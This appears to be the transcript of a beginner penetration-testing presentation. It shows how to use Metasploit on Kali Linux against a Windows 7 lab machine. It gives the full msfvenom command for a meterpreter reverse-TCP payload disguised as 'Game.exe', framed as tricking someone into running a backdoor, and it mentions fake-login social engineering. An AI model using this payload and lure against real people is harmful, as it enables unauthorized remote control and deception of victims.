Hack from the Kali Linux into a Windows 7

In this presentation we are going to see how to hack Windows 7 from Kali Linux by using Metasploit framework that comes with the Kali Linux.
Metasploit framework is one of the most powerful frameworks for system vulnerability testing and penetration testing Metasploit.
First of all we have to open both of our machines.
Then we are going to start the Metasploit framework which you can find on the left hand bar or you can come under Application - Exploitation Tools - Metasploit. Either one of those will help to  open it up

Run the Metasploit framework

And now we are going to open a second terminal window and you can see this is terminal driven. Now we start the postgresql or postgresql database service so that we can search really quickly we use the command service postgresql start

And we have got a database up running.
Just as a reality check Ifconfig and it tells us we are on 10.0.2.15 but it may slightly different if you start the windows box after your kali Linux box on the private network it may pick up a different address.

First thing we have done is run on Metasploit console in this msf the Metasploit framework console and you can see I have prompt down here for msf.

Now are going to start msfvenom and going to create a payload. It is going to be an executable file that will be able to run from my windows computer and I’m going to save that up on a web server on this Kali Linux box. This is similar when we use the social engineering tool kit which is used to fool someone into downloading something looks like a game but actually gives us a back door into control their computer as an administrator or someone entering into their user credentials into a fake facebook page. So the command we want to run is msfvenom.
And next we want to specify a payload that we are going to deliver to our Windows 7 box and that payload is going to be a very powerful tool called meterpreter. Meterpreter comes with the Metasploit framework and it allows us to set up an interpreter or running shell that let us communicate to that Windows 7 box. This will be able to eventually take over as an administrator. 
msfvenom gets followed by –p for payload windows
windows/meterpreter/reverse_tcp that is going to establish a reverse tcp connection in other words the Windows 7 box is going to call the Kali Linux machine using the TCP IP that the world wide web uses to communicate. So this is going to establish a connection from the Windows 7 box back to Kali Linux box and what we need to tell is the host address of the Kali Linux box. For this we use LHOST= and we give the IP address of the Kali Linux box. But make sure whatever your ifconfig says.
Then next tell the format that we want to export this payload and that is going to be –f and it is going to be an exe file or an executable file for windows.
And now we need to tell the name of the file and where we want to store. This will create a payload or an executable file that we are going to run on the Windows 7 computer.
Lets call the file as Game.exe
msfvenom –p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 –f exe –o /root/Desktop/Game.exe

So this is going to look like a game that we are tricking someone into downloading and running on their Windows 7 computer.
Once we run that if you put the output location is /root/Desktop/Game.exe we pull this down now we see this Game.exe is here in Kali Linux desktop so this is created on windows executable notice an x86 windows platform executable that is an executable format exe called Game.exe.
